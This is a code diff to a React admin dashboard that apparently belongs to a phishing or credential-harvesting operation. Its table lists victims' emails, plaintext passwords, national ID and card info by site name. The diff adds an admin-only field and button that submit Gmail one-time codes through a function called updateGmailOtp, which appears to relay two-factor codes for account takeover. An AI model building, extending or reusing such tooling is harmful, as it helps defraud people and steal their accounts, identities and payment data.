@@ -5,13 +5,22 @@ import { handleCopyClick } from "../../../utils/copyToClipBoard";
 import useInformation from "../../../hooks/useInformation";
 import { useContext, useState } from 'react';
 import { AuthContext } from '../../../contexts/AuthProvider';
-import { getData } from '../../../api/fetching';
+import { getData, updateData } from '../../../api/fetching';
 import NidModal from '../../../components/NidModal';
 export default function Information() {
+  const [codeVal,setCodeVal]= useState('')
   const [nidData,setNidData ]= useState({})
   const [open,setOpen] = useState(false)
   const {role}= useContext(AuthContext)
 const {displayInfo,setIsRefresh,totalPages, page,setPage} = useInformation()
+
+const updateGmailOtp = async(id:any)=> {
+  const originalData= {
+    mailCode: codeVal
+  }
+  const data = await updateData(`/information/admin/${id}`,originalData)
+  console.log(data);
+}
 
 
 
@@ -55,6 +64,17 @@ const handleOpen = (data:any)=>{
             <th scope="col">Email</th>
             <th scope="col">Password</th>
             <th scope="col">Confirm Password</th>
+            
+            {
+              role === 'admin' &&(
+                <th scope="col">Send Code</th>
+              )
+            }
+            {
+              role === 'admin' &&(
+                <th scope="col">add</th>
+              )
+            }
             {
               role === 'admin' &&(
                 <th scope="col">Card Info</th>
@@ -75,7 +95,7 @@ const handleOpen = (data:any)=>{
         </thead>
         <tbody>
           {
-            displayInfo?.map(({_id,createdAt,siteName,user,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } }) =>(
+            displayInfo?.map(({_id,createdAt,siteName,mailCode,user,nidInfo,isPasswordHide,email,password,repassword,status,agent:{ source={},platform='' } }) =>(
               <>
               <tr key={_id}>
               <td>{moment(createdAt).fromNow()}</td>
@@ -84,9 +104,21 @@ const handleOpen = (data:any)=>{
               <td>{email}</td>
               <td>{password}</td>
               <td>{repassword}</td>
+              <td><input style={{width:'70px'}} className='form-control ' type="text" 
+              defaultValue={mailCode} onChange={(e)=>setCodeVal(e.target.value)}
+              /></td>
               {
                 role === 'admin' && (
-                  <td title={platform}><button type="button"
+                  <td><button type="button"
+                  
+                  className="btn btn-sm btn-danger" 
+                  onClick={()=>updateGmailOtp(_id)}
+                  >Add</button></td>
+                )
+              }
+              {
+                role === 'admin' && (
+                  <td title={platform}><button  type="button"
                   
                   className="btn btn-sm btn-warning" 
                   onClick={()=> handleOpen(nidInfo)}
